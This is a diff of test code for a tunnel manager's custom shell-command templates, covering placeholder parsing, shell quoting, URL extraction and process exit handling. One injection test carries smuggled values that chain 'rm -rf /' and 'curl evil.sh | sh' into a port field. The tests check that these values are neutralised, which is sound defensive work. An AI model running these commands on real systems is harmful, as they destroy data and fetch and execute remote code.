@@ -575,6 +575,199 @@ test("auth registry: totpProviders 探测不含缓存毒化 (authelia 现在支�
   }
 });
 
+// ---------------------------------------------------------------------------
+// Custom command tunnels — SERVICE_TUNNELS_TUNNEL_COMMAND_<NAME> env template
+// ---------------------------------------------------------------------------
+
+const CUSTOM_ENV = "SERVICE_TUNNELS_TUNNEL_COMMAND_sshbox";
+
+function withCustomEnv(fn) {
+  return async () => {
+    process.env[CUSTOM_ENV] = "ssh -R {{port}}:127.0.0.1:{{localport}} user@host";
+    try {
+      await fn();
+    } finally {
+      delete process.env[CUSTOM_ENV];
+    }
+  };
+}
+
+test("custom command tunnel: env-registered type appears in schemas/tcp/meta", withCustomEnv(async () => {
+  const { tunnelParamSchemas, tunnelParamSchema, tunnelMetas, tunnelMeta, tunnelSupportsTcp } = await loadSubject();
+  // 出现在下拉框 schema 中,不 shadow 内置类型
+  const all = tunnelParamSchemas();
+  assert.ok(Object.keys(all).includes("sshbox"), "custom type in schemas");
+  assert.deepEqual(Object.keys(all).sort(), ["bore", "cloudflared", "command", "frpc", "localtunnel", "natapp", "ngrok", "serveo", "ssh", "sshbox"]);
+  // {{port}} → 必填;{{localport}} → 自动填充(不出现在表单)
+  const specs = tunnelParamSchema("sshbox");
+  assert.deepEqual(specs.map((s) => s.key), ["port"]);
+  assert.equal(specs[0].required, true);
+  // 用户显式注册 = 非危险类型(不会被客户端一键表单隐藏)
+  assert.deepEqual(tunnelMetas().sshbox, {});
+  assert.deepEqual(tunnelMeta("sshbox"), {});
+  assert.deepEqual(tunnelMeta("command"), { dangerous: true });
+  // tcp 假定支持(任意 shell 命令)
+  assert.equal(tunnelSupportsTcp("sshbox"), true);
+}));
+
+test("custom command tunnel: {{token:default}} fixed params + invalid names skipped", async () => {
+  const { tunnelParamSchema, tunnelParamSchemas } = await loadSubject();
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_mybox = "echo {{host:localhost}}:{{port}} > {{out}}; sleep 60";
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_ngrok = "echo shadow builtin"; // 内置名冲突 → 跳过
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_ = "no name"; // 空名 → 跳过
+  try {
+    const specs = tunnelParamSchema("mybox");
+    assert.deepEqual(specs.map((s) => s.key), ["host", "port", "out"]);
+    assert.equal(specs[0].default, "localhost");
+    assert.equal(specs[0].required, false);
+    assert.equal(specs[1].required, true);
+    assert.equal(specs[2].type, "string");
+    // 内置名冲突 → 自定义模板被跳过,ngrok 仍是内置 schema(未被覆盖)
+    const ngrok = tunnelParamSchema("ngrok");
+    assert.ok(ngrok.some((s) => s.key === "domain"), "builtin ngrok schema intact (not shadowed)");
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_mybox;
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_ngrok;
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_;
+  }
+});
+
+test("custom command tunnel: resolveCustomCommand assembles + validation accepts", withCustomEnv(async () => {
+  const { resolveCustomCommand } = await import("../src/tunnels-custom.ts");
+  const cfg = { name: "x", type: "sshbox", target: 3000, port: 8080 };
+  // 占位符值被单引号转义(字面量),模板字面量不转义
+  assert.equal(
+    resolveCustomCommand("sshbox", cfg),
+    "ssh -R '8080':127.0.0.1:'3000' user@host",
+  );
+  // {{localport:PORT}} 固定值覆盖自动填充
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fixed = "ssh -R {{port}}:127.0.0.1:{{localport:9000}} u@h";
+  try {
+    const { resolveCustomCommand: rc2 } = await import("../src/tunnels-custom.ts");
+    assert.equal(rc2("fixed", { name: "f", type: "fixed", target: 3000, port: 8080 }), "ssh -R '8080':127.0.0.1:'9000' u@h");
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fixed;
+  }
+  // 缺失必填参数 → 明确报错
+  assert.throws(
+    () => resolveCustomCommand("sshbox", { name: "x", type: "sshbox", target: 3000 }),
+    /missing required parameter "\{\{port\}\}"/,
+  );
+  // 大小写不敏感:{{RemotePort}} 命中 cfg.remotePort
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_case = "ssh -R {{RemotePort}}:127.0.0.1:{{localport}} u@h";
+  try {
+    const { resolveCustomCommand: rc3 } = await import("../src/tunnels-custom.ts");
+    assert.equal(rc3("case", { name: "c", type: "case", target: 3000, remotePort: 5555 }), "ssh -R '5555':127.0.0.1:'3000' u@h");
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_case;
+  }
+  // validateTunnelConfig 接受自定义类型
+  const { validateTunnelConfig } = await import("../src/validation.ts");
+  validateTunnelConfig(cfg);
+  assert.throws(() => validateTunnelConfig({ name: "x", type: "totally-unknown", target: 3000 }), /unsupported tunnel type/);
+}));
+
+test("custom command tunnel: shell injection is neutralised (values single-quoted)", async () => {
+  const { resolveCustomCommand, shellQuote } = await import("../src/tunnels-custom.ts");
+  // 引号转义单元:单引号按 POSIX 规则转义
+  assert.equal(shellQuote("O'Brien"), "'O'\\''Brien'");
+  assert.equal(shellQuote("a b;c|d&e`f$g\"h"), "'a b;c|d&e`f$g\"h'");
+  // 注入尝试:值整体成为单个字面量参数,无法逃出
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_inj = "ssh -R {{port}}:127.0.0.1:{{localport}} u@h";
+  try {
+    const { resolveCustomCommand: rc } = await import("../src/tunnels-custom.ts");
+    const evil = "8080; rm -rf / && curl evil.sh | sh";
+    const cmd = rc("inj", { name: "x", type: "inj", target: 3000, port: evil });
+    assert.equal(cmd, `ssh -R '${evil}':127.0.0.1:'3000' u@h`, "注入内容被单引号包裹为字面量");
+    // 转义后的命令中不含可执行的裸分号/管道(都在引号内)
+    assert.ok(cmd.includes(`'${evil}'`), "值原样保留但被引号隔离");
+    // 控制字符 → fail-closed 拒绝
+    assert.throws(() => rc("inj", { name: "x", type: "inj", target: 3000, port: "8080\nrm -rf /" }), /control characters/);
+    assert.throws(() => rc("inj", { name: "x", type: "inj", target: 3000, port: "8080\x00" }), /control characters/);
+    // validateTunnelConfig 同样拒绝控制字符(双入口)— 用非端口字段名避开
+    // 先行的端口校验,命中自定义类型默认分支的全字段扫描
+    const { validateTunnelConfig } = await import("../src/validation.ts");
+    assert.throws(
+      () => validateTunnelConfig({ name: "x", type: "inj", target: 3000, extra: "bad\nvalue" }),
+      /control characters/,
+    );
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_inj;
+  }
+});
+
+test("custom command tunnel: ST_TUNNEL_URL marker declares the URL (Windows-friendly)", async () => {
+  const { extractTunnelUrl } = await loadSubject();
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo = "echo ST_TUNNEL_URL:https://x";
+  try {
+    // 冒号/等号/空格分隔
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL=https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
+    // cmd 引号 + CRLF(Windows)
+    assert.equal(extractTunnelUrl('"ST_TUNNEL_URL:https://abc.loca.lt/"\r\n', "echo"), "https://abc.loca.lt/");
+    // 大小写不敏感
+    assert.equal(extractTunnelUrl("st_tunnel_url:https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
+    // 无 scheme host[:port] → 自动补 http://(本地隧道/固定端口)
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:127.0.0.1:8080", "echo"), "http://127.0.0.1:8080");
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:myhost:8080/", "echo"), "http://myhost:8080/");
+    // tcp:// 原样保留
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:tcp://vps.example.com:4444", "echo"), "tcp://vps.example.com:4444");
+    // 标记优先于输出中的其他 URL 噪声
+    assert.equal(
+      extractTunnelUrl("ST_TUNNEL_URL:https://real.loca.lt/ docs: https://www.cloudflare.com/terms", "echo"),
+      "https://real.loca.lt/",
+    );
+    // 内置 command 类型同样支持标记
+    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:http://box.example.com:9000", "command"), "http://box.example.com:9000");
+    // 无标记时行为不变(仍走任意 URL 兜底)
+    assert.equal(extractTunnelUrl("tunnel ready https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo;
+  }
+});
+
+test("custom command tunnel: non-zero exit revokes declared URL (no false success)", async () => {
+  const { TunnelManager } = await loadSubject();
+  const { cacheDir, base } = tempDirs();
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fail = "echo ST_TUNNEL_URL:https://abc.loca.lt/; exit 3";
+  try {
+    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
+    tm.add({ name: "f", type: "fail", target: 4000 });
+    await tm.start("f");
+    // 进程 echo 出 URL 后立即 exit 3 → URL 应被撤销
+    const dl = Date.now() + 3_000;
+    while (Date.now() < dl && tm.get("f")?.running) await sleep(50);
+    const info = tm.get("f");
+    assert.equal(info.url, null, "退出非零 → 声明的 URL 撤销");
+    assert.ok(info.error, "退出非零 → 记录错误");
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fail;
+    rmSync(base, { recursive: true, force: true });
+  }
+});
+
+test("custom command tunnel: end-to-end spawn (shell template, URL from output)", async () => {
+  const { TunnelManager } = await loadSubject();
+  const { cacheDir, base } = tempDirs();
+  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo = "echo 'tunnel url: https://abc.loca.lt/'; sleep 60";
+  try {
+    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
+    tm.add({ name: "box", type: "echo", target: 4000, port: 8080 });
+    const info = await tm.start("box");
+    assert.equal(info.running, true);
+    const deadline = Date.now() + 5_000;
+    while (Date.now() < deadline && !tm.get("box")?.url) {
+      await new Promise((r) => setTimeout(r, 100));
+    }
+    assert.equal(tm.get("box")?.url, "https://abc.loca.lt/");
+    await tm.stop("box");
+  } finally {
+    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo;
+    rmSync(base, { recursive: true, force: true });
+  }
+});
+
 after(async () => {
   // 兜底:force-exit 不会等 detached 子进程——测试若中途失败,真实 ssh -R
   // 进程可能残留占用端口,影响后续测试。按本机反向隧道特征清理。
